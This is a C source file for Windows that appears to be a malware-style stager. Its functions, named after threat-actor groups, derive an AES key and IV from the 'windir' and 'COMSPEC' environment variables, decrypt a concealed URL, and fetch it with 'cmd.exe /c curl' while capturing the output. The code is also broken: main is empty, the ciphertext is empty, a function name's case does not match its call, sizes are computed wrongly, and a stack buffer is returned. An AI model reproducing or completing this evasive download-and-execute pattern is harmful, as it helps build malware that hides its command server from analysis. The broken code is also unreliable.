#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winhttp.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <string.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/err.h>


#include "convenince.h"

int main(){

}




char *once(){

    char *Good_Riddance = "";
    
    char *out;

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Create pipe for child STDOUT
    HANDLE readPipe, writePipe;
    CreatePipe(&readPipe, &writePipe, &sa, 0);

    // Ensure the read pipe handle is not inherited
    SetHandleInformation(readPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = writePipe;   // Child stdout → pipe
    si.hStdError  = writePipe;   // (optional) capture stderr too
    si.hStdInput  = NULL;

    char* var1str = Voltzite(Good_Riddance);

    char cmd[512];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c curl -X GET %s", var1str);

    // Start process
    if (!CreateProcessA(
        NULL,
        cmd,
        NULL,
        NULL,
        TRUE,        // inherit handles (must be TRUE)
        0,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return (char*)1;
    }

    CloseHandle(writePipe); // parent doesn't write

    // Read child's stdout
    char buffer[4096];
    DWORD bytesRead;

    while (ReadFile(readPipe, buffer, sizeof(buffer)-1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
    }
    out = buffer;
    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(readPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    free(var1str);
    return out;
}

char * Voltzite(const unsigned char* cipherText){
    unsigned char key[32];
    unsigned char iv[16];
    Group123(iv);
    Black_Vine(key);

    return sam(cipherText, sizeof(cipherText), key, sizeof(key), iv, sizeof(iv));
}

void Group123(unsigned char out[16]){
    unsigned char buffer[MAX_PATH] = {0};
    DWORD len = GetEnvironmentVariableA("windir", (char*)buffer, sizeof(buffer));

    // Fill output with zeros first
    for (int i = 0; i < 16; i++)
        out[i] = 0x00;

    if (len == 0 || len >= sizeof(buffer))
        return;

    size_t n = (len < 16) ? len : 16;
    for (size_t i = 0; i < n; i++)
        out[i] = buffer[i];
}

void Black_Vine(unsigned char out[32]){

    unsigned char buffer[MAX_PATH] = {0};
    DWORD len = GetEnvironmentVariableA("COMSPEC", (char*)buffer, sizeof(buffer));

    // Fill output with zeros first
    for (int i = 0; i < 32; i++)
        out[i] = 0x00;

    if (len == 0 || len >= sizeof(buffer))
        return;

    size_t n = (len < 32) ? len : 32;
    for (size_t i = 0; i < n; i++)
        out[i] = buffer[i];
}

char* Sam(const unsigned char* cipherText, int cipherTextLen, const unsigned char* Key, int KeyLen, const unsigned char* IV, int IVLen) {
    if (cipherText == NULL || cipherTextLen <= 0) {
        return NULL;
    }
    if (Key == NULL || KeyLen <= 0) {
        return NULL;
    }
    if (IV == NULL || IVLen <= 0) {
        return NULL;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        return NULL;
    }

    // Initialize decryption operation with AES CBC mode
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, Key, IV) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }

    unsigned char* plaintext = malloc(cipherTextLen + AES_BLOCK_SIZE);
    if (!plaintext) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }

    int len = 0;
    int plaintext_len = 0;

    if (EVP_DecryptUpdate(ctx, plaintext, &len, cipherText, cipherTextLen) != 1) {
        free(plaintext);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }
    plaintext_len = len;

    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
        free(plaintext);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }
    plaintext_len += len;

    EVP_CIPHER_CTX_free(ctx);

    // Null-terminate the plaintext string
    plaintext[plaintext_len] = '\0';

    return (char*)plaintext;
}